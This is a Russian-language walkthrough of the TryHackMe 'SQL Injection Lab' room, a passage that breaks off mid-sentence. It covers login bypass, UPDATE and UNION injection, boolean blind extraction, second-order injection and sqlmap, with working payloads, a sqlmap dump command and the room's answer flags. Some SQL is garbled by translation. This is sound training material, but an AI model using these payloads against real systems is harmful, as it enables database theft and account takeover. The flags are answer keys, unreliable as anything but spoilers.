[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [SQL Injection Lab](https://tryhackme.com/r/room/sqlilab) 

Всего 10 заданий:
## Задание 1
Эта комната предназначена для введения в SQL- инъекцию и демонстрирует различные атаки SQL- инъекции. Она не 
предназначена для изучения самого языка SQL. Настоятельно рекомендуется иметь некоторые предварительные знания языка 
SQL.  

Веб-приложение можно найти по адресу:  http://10.10.162.127:5000

Примечание: для развертывания потребуется не менее пяти минут.

Можно отобразить SQL-запросы, выполненные приложением в задачах, включив «Показать запрос» в правом верхнем меню на  
http://10.10.162.127:5000. Также можно отобразить руководство по задачам, включив «Руководство». 

Все скрипты, упомянутые в задачах, можно просмотреть и загрузить, посетив страницу «Загрузки» в верхнем левом углу 
целевой страницы или перейдя по адресу http://10.10.162.127:5000/downloads/. 

### Ответить на вопросы ниже
```commandline
Ответ не нужен
```

## Задание 2
SQL- инъекция — это метод, с помощью которого злоумышленники могут выполнять свои собственные вредоносные SQL- 
выражения, обычно называемые вредоносной полезной нагрузкой. С помощью вредоносных SQL- выражений злоумышленники 
могут украсть информацию из базы данных жертвы; что еще хуже, они могут вносить изменения в базу данных. Наше 
веб-приложение для управления сотрудниками имеет уязвимости SQL- инъекции, которые имитируют ошибки, часто 
допускаемые разработчиками.    

Приложениям часто требуются динамические SQL -запросы для отображения контента на основе различных условий, 
установленных пользователем. Чтобы разрешить динамические SQL- запросы, разработчики часто объединяют 
пользовательский ввод непосредственно в оператор SQL . Без проверки полученных входных данных конкатенация строк 
становится наиболее распространенной ошибкой, которая приводит к уязвимости SQL- инъекции. Без очистки входных 
данных пользователь может заставить базу данных интерпретировать пользовательский ввод как оператор SQL, а не как 
данные. Другими словами, злоумышленник должен иметь доступ к параметру, которым он может управлять, который входит в 
оператор SQL . Имея контроль над параметром, злоумышленник может внедрить вредоносный запрос, который будет выполнен 
базой данных. Если приложение не очищает заданные входные данные из контролируемого злоумышленником параметра, 
запрос будет уязвим для атаки SQL- инъекции.         

Следующий код PHP демонстрирует динамический SQL- запрос в форме входа. Переменные пользователя и пароля из запроса 
POST объединяются непосредственно в оператор SQL. 

`$ query  =  " SELECT * FROM users WHERE username=' "  +  $ _POST [ " user " ]  +  " ' AND password= ' "  +  $ _POST [ " password " ] $  +  ' ";"`
Если злоумышленник предоставляет значение  ' OR 1 = 1 -- -  внутри параметра имени, запрос может вернуть более 
одного пользователя. Большинство приложений обработают первого возвращенного пользователя, что означает, что 
злоумышленник может воспользоваться этим и войти в систему как первый пользователь, возвращенный запросом. 
Последовательность двойного тире (--) является индикатором комментария в SQL и приводит к тому, что остальная часть 
запроса закомментируется. В SQL строка заключается либо в одинарную кавычку ('), либо в двойную кавычку ("). 
Одинарная кавычка (') во входных данных используется для закрытия строкового литерала. Если злоумышленник вводит  ' 
OR 1 = 1 -- -  в параметр имени и оставляет пароль пустым, запрос выше приведет к следующему оператору SQL.

ВЫБЕРИТЕ  *  ИЗ  пользователей,  ГДЕ  имя пользователя  =  ''  ИЛИ  1 = 1 -- - '  И пароль =  ''
Если база данных выполняет SQL-выражение выше, возвращаются все пользователи в таблице пользователей. Следовательно, 
злоумышленник обходит механизм аутентификации приложения и входит в систему как первый пользователь, возвращенный 
запросом.   

Причина использования  -- - вместо  --  в первую очередь связана с тем, как MySQL обрабатывает стиль комментариев с 
двойным тире.  

От  последовательности --   до конца строки. В MySQL  стиль комментариев --   (двойное тире) требует, чтобы за 
вторым тире следовал хотя бы один пробел или управляющий символ (такой как пробел, табуляция, новая строка и т. д.). 
Этот синтаксис немного отличается от стандартного синтаксиса комментариев SQL, как обсуждалось в разделе 1.7.2.4, «' 
-- ' как начало комментария». ( dev.mysql.com )   

 Самым безопасным решением для встроенного комментария SQL является использование --<пробел><любой символ>, например 
 -- -,  поскольку если он закодирован в URL в  --%20-, он все равно будет декодирован как  -- - . Для получения 
 дополнительной информации см.:  https://blog.raw.pm/en/sql-injection-mysql-comment/

SQL- инъекция 1: поле ввода, не являющееся строкой
Когда пользователь входит в систему, приложение выполняет следующий запрос:

ВЫБЕРИТЕ  uid,  имя,  profileID,  зарплату,  номер паспорта,  email,  псевдоним,  пароль ИЗ usertable, ГДЕ profileID 
= 10 И пароль =  'ce5ca67... ' 
При входе в систему пользователь вводит данные в параметр profileID. Для этого вызова параметр принимает целое число,
как можно увидеть здесь: 

профильID = 10
Поскольку очистка входных данных не производится, можно обойти вход в систему, используя любое истинное условие, 
например, указанное ниже в качестве ProfileID. 

1  или  1 = 1 -- -
Обойдите вход в систему и восстановите флаг.

SQL- инъекция 2: строка поля ввода
В этом вызове используется тот же запрос, что и в предыдущем вызове. Однако параметр ожидает строку вместо целого 
числа, как можно увидеть здесь: 

профильID = ' 10 '
Поскольку он ожидает строку, нам нужно изменить нашу полезную нагрузку, чтобы немного обойти вход. Следующая строка 
позволит нам войти: 

1 '  или  ' 1 ' = ' 1 ' -- -
Обойдите вход в систему и восстановите флаг.

SQL -инъекция 3 и 4: URL- и POST-инъекция
Здесь SQL- запрос такой же, как и предыдущий:

ВЫБЕРИТЕ  uid ,  имя ,  profileID ,  зарплату ,  номер паспорта ,  email ,  псевдоним ,  пароль  ИЗ  usertable  , 
ГДЕ  profileID = ' 10 '  И  пароль = ' ce5ca67... ' 
Однако в этом случае вредоносный пользовательский ввод не может быть внедрен непосредственно в приложение через 
форму входа, поскольку были реализованы некоторые элементы управления на стороне клиента: 

функция  validateform ()  {
    var  profileID  =  document.inputForm.profileID.value ;
    var  пароль  =  документ.inputForm.пароль.значение ;

    если  ( / ^ [ a-zA-Z0-9 ]* $ / . test ( profileID )  ==  false  || / ^ [ a-zA-Z0-9 ]* $ / . test ( password )  == false )  {  
        alert ( " Поля ввода не могут содержать специальные символы " ) ;
        вернуть  ложь ;
    }
    если  ( profileID  ==  null  ||  пароль  ==  null )  {
        alert ( " Поля ввода не могут быть пустыми. " ) ;
        вернуть  ложь ;
    }
}
Приведенный выше код JavaScript требует, чтобы и profileID, и пароль содержали только символы между az, AZ и 0-9. 
Клиентские элементы управления предназначены только для улучшения пользовательского опыта и никоим образом не 
являются функцией безопасности, поскольку пользователь имеет полный контроль над клиентом и отправляемыми им данными.
Например, прокси-инструмент, такой как Burp Suite, можно использовать для обхода проверки JavaScript на стороне 
клиента ( https://portswigger.net/support/using-burp-to-bypass-client-side-javascript-validation ).     

### SQL -инъекция 3: URL-инъекция
В этом задании используется запрос GET при отправке формы входа, как показано здесь:

Вход в систему и проверку на стороне клиента можно легко обойти, перейдя непосредственно по этому URL-адресу:

http://10.10.162.127:5000/sesqli3/login?profileID=-1' или 1=1-- -&password=a

Браузер автоматически urlencode это для нас. Urlencode необходимо, так как протокол HTTP не поддерживает все символы 
в запросе. После urlencode URL выглядит следующим образом: 

http://10.10.162.127:5000 /sesqli3/login?profileID=-1%27%20or%201=1--%20-&password=a

%27 становится символом одинарной кавычки ('), а %20 становится пробелом.

### SQL- инъекция 4: POST-инъекция
При отправке формы входа для этого вызова используется метод HTTP POST. Можно либо удалить/отключить JavaScript, 
проверяющий форму входа, либо отправить действительный запрос и перехватить его с помощью прокси-инструмента, такого 
как Burp Suite, и изменить его:  


Информацию о том, как работает Burp Suite, можно найти на   странице Burp Suite  .

#### Ответить на вопросы ниже
```commandline
# task 2
# http://10.10.255.151:5000/

http://10.10.255.151:5000/sesqli1/login?next=http%3A%2F%2F10.10.74.12%3A5000%2Fsesqli1%2Fhome
profileID: 1 or 1=1-- -
THM{dccea429d73d4a6b4f117ac64724f460}

http://10.10.255.151:5000/sesqli2/login?next=http%3A%2F%2F10.10.74.12%3A5000%2Fsesqli2%2Fhome
profileID: 1' or '1'='1'-- -
THM{356e9de6016b9ac34e02df99a5f755ba}

http://10.10.255.151:5000/sesqli3/login?next=http%3A%2F%2F10.10.74.12%3A5000%2Fsesqli3%2Fhome
in url
http://10.10.255.151:5000/sesqli3/login?profileID=1%27%20or%201=1%20--%20-&password=pass
THM{645eab5d34f81981f5705de54e8a9c36}

http://10.10.255.151:5000/sesqli4/login?next=http%3A%2F%2F10.10.74.12%3A5000%2Fsesqli4%2Fhome
burp
profileID=admin' or 1=1 -- -&password=pass
THM{727334fd0f0ea1b836a8d443f09dc8eb}

http://10.10.255.151:5000/sesqli5/login?next=http%3A%2F%2F10.10.74.12%3A5000%2Fsesqli5%2Fhome
profileID: 10
password: toor
```
Что такое флаг для SQL-инъекции 1: поле ввода не является строкой?
```commandline
THM{dccea429d73d4a6b4f117ac64724f460}
```
Что такое флаг для SQL-инъекции 2: строка поля ввода?
```commandline
THM{356e9de6016b9ac34e02df99a5f755ba}
```
Что такое флаг SQL-инъекции 3: URL-инъекция?
```commandline
THM{645eab5d34f81981f5705de54e8a9c36}
```
Что такое флаг для SQL-инъекции 4: POST-инъекция?
```commandline
THM{727334fd0f0ea1b836a8d443f09dc8eb}
```

## Задание 3
### Атака SQL -инъекции на оператор UPDATE
 Если SQL- инъекция происходит в операторе UPDATE, ущерб может быть гораздо более серьезным, поскольку это позволяет 
 изменять записи в базе данных. В приложении управления сотрудниками есть страница редактирования профиля, как 
 показано на следующем рисунке.  

Эта страница редактирования позволяет сотрудникам обновлять свою информацию, но у них нет доступа ко всем доступным 
полям, и пользователь может только изменять свою информацию. Если форма уязвима для SQL- инъекции, злоумышленник 
может обойти реализованную логику и обновить поля, которые им не положено обновлять, или для других пользователей.  

Теперь мы перечислим базу данных с помощью оператора UPDATE на странице профиля. Предположим, что у нас нет никаких 
предварительных знаний о базе данных. Просматривая исходный код веб-страницы, мы можем определить потенциальные 
имена столбцов, просматривая атрибут name. Столбцы не обязательно должны быть названы так, но есть большая 
вероятность, что это так, и такие имена столбцов, как «email» и «password», не являются редкостью и могут быть легко 
угаданы.    


Чтобы подтвердить, что форма уязвима и что у нас есть рабочие имена столбцов, мы можем попробовать внедрить в поля 
«nickName» и «email» что-то похожее на код ниже: 

`asd ' , nickName = ' test ' , email = ' взломан`
При внедрении вредоносной нагрузки в поле nickName обновляется только nickName. При внедрении в поле email 
обновляются оба поля: 



Первый тест подтвердил, что приложение уязвимо и что у нас правильные имена столбцов. Если бы у нас были 
неправильные имена столбцов, ни одно из полей не было бы обновлено. Поскольку оба поля обновляются после внедрения 
вредоносной нагрузки, исходный оператор SQL , вероятно, выглядит примерно так:  

ОБНОВЛЕНИЕ  < имя_таблицы >  SET  nickName = ' имя ' ,  email = ' адрес электронной почты '  ГДЕ  < условие >
Имея эти знания, мы можем попытаться определить, какая база данных используется. Есть несколько способов сделать это,
но самый простой способ — попросить базу данных идентифицировать себя. Следующие запросы можно использовать для 
идентификации MySQL, MSSQL, Oracle и SQLite:  
```commandline
# MySQL и MSSQL
', ник =@@ версия , эл. почта = '
# Для Оракула
', nickName =( ВЫБРАТЬ  баннер  ИЗ  v $ version ), email = '
# Для SQLite
', ник = sqlite_version (), электронная почта = '
```

Вставка строки с «sqlite_version()» в поле nickName показывает, что мы имеем дело с SQLite и что номер версии — 3.27.2:



Знание того, с какой базой данных мы имеем дело, облегчает понимание того, как строить наши вредоносные запросы. Мы 
можем продолжить перечисление базы данных, извлекая все таблицы. В коде ниже мы выполняем подзапрос для извлечения 
всех таблиц из базы данных и помещаем их в поле nickName. Подзапрос заключен в скобки.  Функция group_concat() 
используется для одновременного дампа всех таблиц.     

«Функция group_concat() возвращает строку, которая является объединением всех ненулевых значений X. Если параметр Y 
присутствует, то он используется в качестве разделителя между экземплярами X. Запятая («,») используется в качестве 
разделителя, если Y опущен. Порядок объединенных элементов произвольный».  

`', nickName =( SELECT  group_concat ( tbl_name )  FROM  sqlite_master  WHERE  type = ' table '  и  tbl_name  НЕ  как  ' sqlite_% ' ), email = '`
Внедрив код выше, мы увидим, что единственная таблица в базе данных называется «usertable»:



Затем мы можем продолжить, извлекая все имена столбцов из пользовательской таблицы:

`', nickName =( SELECT  sql  FROM  sqlite_master  WHERE  type != ' meta '  AND  sql  NOT  NULL  AND  name = ' usertable ' ), email = '`
И как видно ниже, таблица пользователей содержит столбцы: UID , имя, profileID, зарплата, номер паспорта, адрес электронной почты, псевдоним и пароль:



Зная имена столбцов, мы можем извлечь нужные нам данные из базы данных. Например, запрос ниже извлечет profileID, 
имя и пароли из usertable. Подзапрос использует  функцию group_concat() для одновременного выгрузки всей информации, 
а  оператор || выполняет функцию «конкатенации» — он объединяет строки своих операндов ( sqlite.org ).   

`, nickName =( SELECT  group_concat ( profileID  ||  " , "  ||  имя  ||  " , "  ||  пароль  ||  " : " )  из  usertable ), email = `

После выгрузки данных из базы данных мы видим, что пароль хеширован. Это означает, что нам нужно будет определить 
правильный тип хэша, если мы хотим обновить пароль для пользователя. Используя идентификатор хэша, такой как 
hash-identifier, мы можем определить хэш как SHA256:  

Существует несколько способов генерации хэша sha256. Например, мы можем использовать  https://gchq.github.io/CyberChef/ :

Затем мы можем обновить пароль для пользователя Admin с помощью следующего кода:

',  пароль = ' 008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601 '  ГДЕ  имя = ' Администратор ' -- -
### Задача
Войдите в " SQL Injection 5: UPDATE Statement" и используйте уязвимую страницу профиля, чтобы найти флаг. Учетные 
данные, которые можно использовать: 

ID профиля:10
пароль:toor


Здесь необходимо выполнить то же перечисление, что и для поиска таблиц и имен столбцов, поскольку флаг хранится 
внутри другой таблицы. 

### Ответить на вопросы ниже
```commandline
# task 3
http://10.10.255.151:5000/sesqli5/profile
admin
',nickName=(SELECT group_concat(secret) from secrets),email='
pass
THM{b3a540515dbd9847c29cffa1bef1edfb}
```
Что такое флаг для SQL-инъекции 5: оператор UPDATE?
```commandline
THM{b3a540515dbd9847c29cffa1bef1edfb}
```

## Задание 4
#### Цель
Цель этого задания — найти способ обойти аутентификацию, чтобы получить флаг. 
#### Описание
На целевой странице http://MACHINE_IP:5000  перейдите в раздел Broken Authentication в разделе Track: Vulnerable Startup ( http://MACHINE_IP:5000/challenge1/ ).

#### Задача
Обойдите вход в систему и восстановите флаг.

### Ответить на вопросы ниже
```commandline
# task 4
http://10.10.255.151:5000/challenge1/login?next=http%3A%2F%2F10.10.255.151%3A5000%2Fchallenge1%2Fhome
profileID: 1' or '1'='1'-- -
THM{f35f47dcd9d596f0d3860d14cd4c68ec}
```
Какой флаг у этого испытания?
```commandline
THM{f35f47dcd9d596f0d3860d14cd4c68ec}
```

## Задание 5
### Цель
Эта задача основывается на предыдущей. Здесь цель — найти способ сбросить все пароли в базе данных, чтобы получить 
флаг без использования слепого внедрения. 

### Описание
Форма входа по-прежнему уязвима для SQL-инъекций, и можно обойти вход, используя  `' OR 1 = 1 -- - ` в качестве имени 
пользователя.  

Прежде чем сбрасывать все пароли, нам нужно определить места, где в приложении возвращаются результаты запроса на 
вход. После входа в систему имя текущего пользователя отображается в правом верхнем углу, поэтому можно сбросить 
данные туда, как показано здесь:  

Данные из запроса также могут быть сохранены в сеансовом cookie. Можно извлечь сеансовый cookie, открыв инструменты 
разработчика в браузере, что можно сделать, нажав F12. Затем перейдите в Storage и скопируйте значение сеансового 
cookie, как показано здесь:  

Затем можно расшифровать cookie по адресу  https://www.kirsle.net/wizards/flask-session.cgi или с помощью 
пользовательского скрипта. Скрипт для расшифровки cookie можно загрузить внутри виртуальной машины , перейдя по 
адресу  http://MACHINE_IP:5000/download/decode_cookie.py .   

После входа в систему с использованием ' OR 1=1-- -  в качестве имени пользователя  ниже можно увидеть 
расшифрованный файл cookie, и ясно, что в него помещены идентификатор пользователя и имя пользователя из запроса на вход.  
```commandline
{
    " challenge2_user_id " :  1 ,
    " challenge2_username " :  " admin "
}
```

Можно сбросить пароли, используя SQL- инъекцию на основе UNION. Для работы инъекции на основе UNION необходимо 
выполнить два ключевых требования: 

Количество столбцов во введенном запросе должно быть таким же, как и в исходном запросе.
Типы данных для каждого столбца должны соответствовать соответствующему типу
При входе в приложение оно выполнило запрос ниже. Из SQL- выражения мы видим, что оно извлекает два столбца: id и 
username. 

ВЫБЕРИТЕ  идентификатор ,  имя пользователя  ИЗ  пользователей,  ГДЕ  имя пользователя  =  ' " + имя пользователя + 
" '  И  пароль  =  ' " + пароль + " ' 
Не зная заранее количество столбцов, злоумышленник должен сначала перечислить количество столбцов, систематически 
вводя запросы с разным количеством столбцов, пока это не увенчается успехом. Например: 
```commandline
 1 '  ОБЪЕДИНЕНИЕ ВЫБИРАЕТ NULL-- -
 1 '  ОБЪЕДИНЕНИЕ ВЫБИРАЕТ NULL, NULL-- -
 1 '  ОБЪЕДИНЕНИЕ ВЫБОР NULL, NULL, NULL-- -
```

В этом случае успешное выполнение означает, что приложение успешно войдет в систему, когда будет введено правильное 
 количество столбцов. В других случаях, если включены сообщения об ошибках, может отображаться предупреждение 
 «SELECT слева и справа от UNION не имеют одинакового количества столбцов результата», когда введено неправильное 
 количество столбцов.   

Используя  ' UNION SELECT 1 , 2 -- -  в качестве имени пользователя, мы сопоставляем количество столбцов в исходном 
запросе SQL , и приложение позволяет нам войти. После входа в систему мы видим, что имя пользователя заменено целым 
числом 2, которое мы использовали в качестве второго столбца во внедренном запросе.     



То же самое касается имени пользователя в сеансовом cookie. Расшифровав его, мы увидим, что имя пользователя было 
заменено тем же значением, что и выше. 
```commandline
{
    " challenge2_user_id " :  1 ,
    " challenge2_имя_пользователя " :  2
}
```

Перечислите базу данных, чтобы найти таблицы и столбцы, как мы делали в Задании 2 Введение в SQL- инъекцию. Для 
этого может быть полезна шпаргалка, например  PayloadsAllTheThings  . Целью задачи было выгрузить все пароли, чтобы 
получить флаг, поэтому в этом случае мы предположим, что имя столбца —  password  , а имя таблицы —  users . 
Используя эту логику, можно выгрузить пароли с помощью следующего кода:

`'  UNION  SELECT  1 ,  пароль  от  пользователей -- -`
Однако предыдущее выражение вернет только один пароль. Функция group_concat() может помочь достичь цели 
одновременного сброса всех паролей.  
Вставив следующий код в поле имени пользователя:

`'  ОБЪЕДИНЕНИЕ  ВЫБЕРИТЕ  1 , group_concat ( пароль )  ОТ  пользователей -- -`
Все пароли сброшены:


Пароли также можно получить, расшифровав cookie-файл сеанса Flask:
```commandline
{
    " challenge2_user_id " :  1 ,
    " challenge2_username " :  " rcLYWHCxeGUsA9tH3GNV,asd,Лето2019!,345m3io4hj3, THM {AuTh2} ,viking123 "
}

```

Задача
Воспользуйтесь уязвимой формой входа и получите флаг.
### Ответить на вопросы ниже
```commandline
# task 5
http://10.10.255.151:5000/challenge2/login?next=http%3A%2F%2F10.10.255.151%3A5000%2Fchallenge2%2Fhome
profileID:' UNION SELECT 1,group_concat(password) FROM users-- -
THM{fb381dfee71ef9c31b93625ad540c9fa}
```
Какой флаг у этого испытания?
```commandline
THM{fb381dfee71ef9c31b93625ad540c9fa}
```
## Задание 6
### Цель
Эта задача имеет ту же уязвимость, что и предыдущая. Однако теперь невозможно извлечь данные из cookie сеанса Flask 
или через отображение имени пользователя. Форма входа по-прежнему имеет ту же уязвимость, но на этот раз цель 
состоит в том, чтобы злоупотребить формой входа с помощью слепой инъекции SQL для извлечения пароля администратора.   

### Описание
Для извлечения пароля будет использоваться слепая инъекция SQL на основе булевых значений. Слепые инъекции 
утомительны и требуют много времени для выполнения вручную, поэтому планируется создать скрипт для извлечения пароля 
посимвольно. Перед созданием скрипта для автоматизации инъекции крайне важно понять, как работает инъекция. Идея 
заключается в отправке SQL-запроса, задающего вопросы «истина» или «ложь» для каждого символа в пароле. Ответ 
приложения будет проанализирован, чтобы понять, вернула ли база данных «истина» или «ложь». В этом случае приложение 
позволит нам войти, если ответ будет успешным, или останется на странице входа, сообщая «Неверное имя пользователя 
или пароль» в случае возврата «ложь», как показано на изображении ниже.      



Как уже говорилось ранее, мы захотим отправить булевы вопросы в базу данных для каждого символа в пароле, спрашивая 
базу данных, угадали ли мы правильный символ или нет. Чтобы добиться этого, нам понадобится способ контролировать, 
на каком символе мы находимся, и увеличивать его каждый раз, когда мы угадаем правильный символ в текущей позиции.  
Функция substr SQLite  может помочь нам достичь этой функциональности.   

«Функция substr SQLite возвращает подстроку из строки, начинающуюся с указанной позиции, с предопределенной длиной». 
( Учебник SQLite ) 

Первый аргумент  substr  — это сама строка, которая будет паролем администратора. Второй аргумент — это начальная 
позиция, а третий аргумент — это длина подстроки, которая будет возвращена. 

SUBSTR (  строка ,  < начало >,  < длина >)
Ниже приведен пример   использования  substr — символ после знака равенства (=) обозначает возвращаемую подстроку.

--  Изменение начала
SUBSTR ( " THM {Слепой} " ,  1 , 1 )  =  T
SUBSTR ( " THM {Слепой} " ,  2 , 1 )  =  H
SUBSTR ( " THM {Слепой} " ,  3 , 1 )  =  M

--  Изменение длины
SUBSTR ( " THM {Слепой} " ,  1 , 3 )  =  THM

Следующим шагом будет ввод пароля администратора в виде строки в  функцию substr  . Это можно сделать с помощью 
следующего запроса: 

`( ВЫБЕРИТЕ  пароль  ИЗ ОГРАНИЧЕНИЯ   пользователей  0 , 1 )`

Предложение  LIMIT  используется для ограничения объема данных, возвращаемых оператором SELECT. Первое число, 0, 
является смещением, а второе целое число — пределом: 

`ПРЕДЕЛ  < СМЕЩЕНИЕ >,  < ПРЕДЕЛ >`
Ниже приведены несколько примеров предложения  LIMIT  в действии. Правая таблица представляет собой пользовательскую 
таблицу. 
```commandline
sqlite >  ВЫБЕРИТЕ  пароль  ИЗ  пользователей  LIMIT  0 , 1
THM { Слепой }
sqlite >  ВЫБЕРИТЕ  пароль  ИЗ  пользователей  LIMIT  1 , 1
Лето 2019!
sqlite >  ВЫБЕРИТЕ  пароль  ИЗ  пользователей  LIMIT  0 , 2
THM { Слепой }
Лето 2019!
THM {Слепой}
Лето 2019!
Викинг123
```

SQL-запрос для возврата первого символа пароля администратора можно увидеть здесь:

SUBSTR (( ВЫБЕРИТЕ  пароль  ИЗ ОГРАНИЧЕНИЯ   пользователей  0 , 1 ), 1 , 1 )
Теперь нам понадобится способ сравнить первый символ пароля с нашим угаданным значением. Сравнивать символы легко, и 
мы можем сделать это следующим образом: 

SUBSTR (( ВЫБЕРИТЕ  пароль  ИЗ ОГРАНИЧЕНИЯ   пользователей  0 , 1 ), 1 , 1 )  =  ' T '
Однако, сработает ли этот подход или нет, будет зависеть от того, как приложение обрабатывает входные данные. 
Приложение преобразует имя пользователя в нижний регистр для этой задачи, что нарушает упомянутый подход, поскольку 
заглавная T не то же самое, что строчная t. Шестнадцатеричное представление ASCII T — 0x54 и 0x74 для строчной t. 
Чтобы справиться с этим, мы можем ввести наш символ в шестнадцатеричном представлении через тип подстановки X , а 
затем использовать выражение CAST SQLite для преобразования значения в тип данных, ожидаемый базой данных.    

"x,X: Аргумент — целое число, отображаемое в шестнадцатеричном формате. Для %x используются строчные 
шестнадцатеричные символы, а для %X — заглавные" - ( sqlite.org ) 

Это означает, что мы можем ввести T как X'54'. Чтобы преобразовать значение в тип SQLite Text, мы можем использовать 
выражение CAST следующим образом: CAST(X'54' as Text). Наш окончательный запрос теперь выглядит следующим образом: 

SUBSTR (( SELECT  password  FROM  users  LIMIT  0 , 1 ), 1 , 1 )  =  CAST ( X ' 54 '  as  Text )
Перед использованием созданного нами запроса нам нужно будет привести его в соответствие с исходным запросом. Наш 
запрос будет помещен в поле имени пользователя. Мы можем закрыть параметр имени пользователя, добавив одинарную 
кавычку ('), а затем добавить оператор AND, чтобы добавить к нему наше условие. Затем добавьте два тире (--), чтобы 
закомментировать проверку пароля в конце запроса. После этого наш вредоносный запрос будет выглядеть следующим образом:   

admin '  AND  SUBSTR (( SELECT  password  FROM  users  LIMIT  0 , 1 ), 1 , 1 )  =  CAST ( X ' 54 '  as  Text ) -- -
При введении этого значения в поле имени пользователя конечный запрос, выполняемый базой данных, будет следующим:

`SELECT  id ,  username  FROM  users  WHERE  username  =  ' admin '  AND  SUBSTR (( SELECT  password  FROM  users  
LIMIT  0 , 1 ), 1 , 1 )  =  CAST ( X ' 54 '  as  Text )` 
Если приложение отвечает перенаправлением 302, то мы нашли первый символ пароля. Чтобы получить весь пароль, 
злоумышленник должен ввести несколько тестов для каждого символа в пароле. Тестирование каждого отдельного символа 
утомительно и проще всего это сделать с помощью скрипта. Одним из простых решений является цикл по каждому 
возможному символу ASCII и сравнение его с символом базы данных. Упомянутый метод генерирует большой трафик к цели и 
не является самым эффективным методом. Пример скрипта предоставляется внутри машины и может быть просмотрен и 
загружен по адресу http://MACHINE_IP:5000/view/challenge3/challenge3-exploit.py ; обратите внимание, что необходимо 
будет изменить длину пароля с помощью переменной password_len. Длину пароля можно узнать, запросив базу данных. 
Например, в запросе ниже мы спрашиваем базу данных, равна ли длина пароля 37:       

admin '  И  длина (( ВЫБЕРИТЕ  пароль  из  пользователей, где имя пользователя= ' admin ' ))== 37 -- -
Кроме того, скрипт требует ненужного количества запросов. Дополнительной проблемой может стать создание более 
эффективного инструмента для извлечения пароля. 

Альтернативный способ решения этой проблемы — использование инструмента, такого как sqlmap, который является 
инструментом с открытым исходным кодом, автоматизирующим процесс обнаружения и эксплуатации уязвимостей SQL- 
инъекций. Для эксплуатации уязвимости с помощью sqlmap можно использовать следующую команду:  

$  sqlmap  -u http :// MACHINE_IP : 5000 / challenge3 / login  -- data = " имя пользователя = admin & пароль = admin " 
-- уровень = 5  -- риск = 3  -- СУБД = sqlite  -- метод = b  -- дамп

### Задача
Воспользуйтесь уязвимой формой входа и получите флаг.

### Ответить на вопросы ниже
```commandline
# task 6
http://10.10.255.151:5000/challenge3/login?next=http%3A%2F%2F10.10.255.151%3A5000%2Fchallenge3%2Fhome
sqlmap -u http://10.10.255.151:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump
y
y
y
y
0
THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}
```
Какой флаг у этого испытания?
```commandline
THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}
```

## Задание 7
### Цель
Здесь предыдущие уязвимости были исправлены, и форма входа больше не уязвима для SQL- инъекции. Команда добавила 
новую функцию заметок, позволяющую пользователям добавлять заметки на своей странице. Цель этого испытания — найти 
уязвимость и сделать дамп базы данных, чтобы найти флаг.  

### Описание
Зарегистрировав новую учетную запись и войдя в приложение, пользователь может перейти к новой функции заметки, нажав 
«Заметки» в верхнем левом меню. Здесь можно добавлять новые заметки, и все заметки пользователя перечислены в нижней 
части страницы, как показано здесь:  

Функция заметок напрямую не уязвима, так как функция вставки заметок безопасна, поскольку использует 
параметризованные запросы. В параметризованных запросах сначала указывается оператор SQL с заполнителями (?) для 
параметров. Затем вводимые пользователем данные передаются в каждый параметр запроса позже. Параметризованные 
запросы позволяют базе данных различать код и данные, независимо от ввода.   

`INSERT INTO notes (username, title, note) VALUES (?, ?, ?)`
Несмотря на то, что используются параметризованные запросы, сервер примет вредоносные данные и поместит их в базу 
данных, если приложение не очистит их. Тем не менее, параметризованный запрос предотвращает ввод данных, приводящий 
к SQL- инъекции. Поскольку приложение может принимать вредоносные данные, все запросы должны использовать 
параметризованные запросы, а не только запросы, напрямую принимающие пользовательский ввод.   

Функция регистрации пользователя также использует параметризованные запросы, поэтому при выполнении запроса ниже 
выполняется только оператор INSERT. Он примет любой вредоносный ввод и поместит его в базу данных, если не очистит 
его, но параметризованный запрос не позволяет вводу привести к SQL- инъекции.  

`INSERT INTO users (username, password) VALUES (?, ?)`
Однако запрос, который извлекает все заметки, принадлежащие пользователю, не использует параметризованные запросы. 
Имя пользователя напрямую объединяется в запрос, что делает его уязвимым для SQL- инъекции.  

`SELECT title, note FROM notes WHERE username = '" + username + "'`
Это означает, что если мы зарегистрируем пользователя с вредоносным именем, все будет хорошо до тех пор, пока 
пользователь не перейдет на страницу заметок, и небезопасный запрос не попытается извлечь данные для вредоносного 
пользователя.  

### Создав пользователя со следующим именем:

`' union select 1,2'`
Мы должны иметь возможность запустить вторичную инъекцию:

С этим именем пользователя приложение выполняет следующий запрос:

`SELECT title, note FROM notes WHERE username = '' union select 1,2''`
Затем на странице заметок как новый пользователь мы видим, что первый столбец в запросе — это заголовок заметки, а 
второй столбец — сама заметка: 



Имея эти знания, это довольно легко эксплуатировать. Например, чтобы получить все таблицы из базы данных, мы можем 
создать пользователя с именем: 

`' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''`
Чтобы найти флаг среди паролей, зарегистрируйте пользователя с именем:

`'  union select 1,group_concat(password) from users'`
Автоматизация эксплуатации с использованием Sqlmap
Можно использовать sqlmap для автоматизации этой атаки, но стандартная атака с sqlmap потерпит неудачу. Внедрение 
происходит при регистрации пользователя, но уязвимая функция находится на странице заметок. Чтобы sqlmap мог 
воспользоваться этой уязвимостью, необходимо выполнить следующие шаги:  

### Регистрация злонамеренного пользователя
Войдите в систему под учетной записью злоумышленника
Перейдите на страницу заметок, чтобы запустить инъекцию.
Можно выполнить все необходимые шаги, создав скрипт подмены. Sqlmap поддерживает скрипты подмены, которые являются 
скриптами, используемыми для подмены данных инъекции. С помощью скрипта подмены мы можем легко изменять полезную 
нагрузку, например, добавляя к ней пользовательскую кодировку. Он также позволяет нам устанавливать другие вещи, такие как файлы cookie.   

Ниже в скрипте tamper есть две пользовательские функции. Первая функция — create_account() , которая регистрирует 
пользователя с полезной нагрузкой sqlmap в качестве имени и 'asd' в качестве пароля. Следующая пользовательская 
функция — login() , которая регистрирует sqlmap как нового созданного пользователя и возвращает cookie сеанса Flask. 
tamper() — главная функция в скрипте, и она имеет полезную нагрузку и **kwargs в качестве аргументов. **kwargs 
содержит информацию, такую как заголовки HTTP, которые нам нужны для помещения cookie сеанса Flask в запрос, 
чтобы позволить sqlmap перейти на страницу заметок для запуска SQL- инъекции. Функция tamper() сначала получает 
заголовки из kwargs , затем создает нового пользователя в приложении, а затем входит в приложение и устанавливает 
